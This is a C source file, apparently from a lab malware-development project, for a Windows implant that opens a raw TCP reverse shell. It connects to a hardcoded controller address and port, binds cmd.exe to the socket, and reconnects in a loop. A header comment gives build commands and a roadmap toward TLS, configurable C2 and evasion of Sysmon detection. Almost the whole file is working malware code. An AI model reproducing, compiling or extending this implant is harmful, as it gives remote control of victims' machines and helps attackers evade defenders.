/*
 * s0P0wn3d implant - v0.1 "brut"
 *
 * Raw reverse shell over TCP. Connects back to the controller and spawns
 * cmd.exe with its standard handles bound to the socket.
 *
 * KNOWN WEAKNESSES (documented on purpose, fixed in later iterations):
 *   - plaintext traffic (trivially readable in Wireshark)   -> v0.2: TLS
 *   - hardcoded C2 host/port (static signature)             -> v0.2: config
 *   - visible console window if launched from Explorer      -> v0.2: subsystem
 *   - cmd.exe spawned as a child process (Sysmon EID 1)     -> v0.3: built-ins
 *   - no persistence, no evasion - that is the point of v0.1
 *
 * Build (from WSL, repo root):
 *   x86_64-w64-mingw32-gcc -Os -o implant.exe implant/implant.c -lws2_32
 * Build (native Windows, WinLibs gcc):
 *   gcc -Os -o implant.exe implant/implant.c -lws2_32
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdbool.h>
#include <stdio.h>

#define C2_HOST "192.168.189.1" /* host VMnet1 address - lab default     */
#define C2_PORT 4444            /* controller port - must match listener */
#define RETRY_DELAY_MS 5000     /* delay between reconnect attempts      */

static bool winsock_init(void)
{
    WSADATA wsa;

    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
}

static SOCKET c2_connect(void)
{
    SOCKET sock;
    struct sockaddr_in c2;

    sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // TODO : CHANGE TCP GO TO HTTPS
    if (sock == INVALID_SOCKET)
        return INVALID_SOCKET;

    memset(&c2, 0, sizeof(c2));
    c2.sin_family = AF_INET;
    c2.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &c2.sin_addr);

    if (connect(sock, (struct sockaddr *)&c2, sizeof(c2)) != 0) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

static bool spawn_shell(SOCKET sock, PROCESS_INFORMATION *pi)
{
    STARTUPINFOA si;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;

    return CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0,
                          NULL, NULL, &si, pi) != 0;
}

static void run_shell_session(SOCKET sock)
{
    PROCESS_INFORMATION pi;

    if (!spawn_shell(sock, &pi))
        return;

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(void)
{
    if (!winsock_init())
        return 1;

    for (;;) {
        SOCKET sock = c2_connect();

        if (sock != INVALID_SOCKET) {
            run_shell_session(sock);
            closesocket(sock);
        }

        Sleep(RETRY_DELAY_MS);
    }

    WSACleanup();
    return 0;
}
